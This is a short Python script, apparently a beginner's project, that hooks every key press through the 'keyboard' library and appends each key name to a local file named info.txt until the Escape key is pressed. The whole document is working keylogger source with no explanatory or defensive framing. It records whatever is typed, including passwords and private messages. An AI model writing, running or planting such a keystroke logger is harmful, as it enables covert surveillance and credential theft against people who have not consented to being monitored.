import keyboard

def teclapres(key):
    with open('info.txt', 'a') as file:
        if key.name == 'space':
            file.write(' ')
        elif key.name == 'enter':
            file.write('\n')
        elif key.name == 'backspace':
            file.write('-1')
        elif key.name == 'esc':
            file.write('"user press esc"')
        elif key.name == 'mayusculas':
            file.write('')
        else:
            file.write(key.name)
            
keyboard.on_press(teclapres)
keyboard.wait('esc')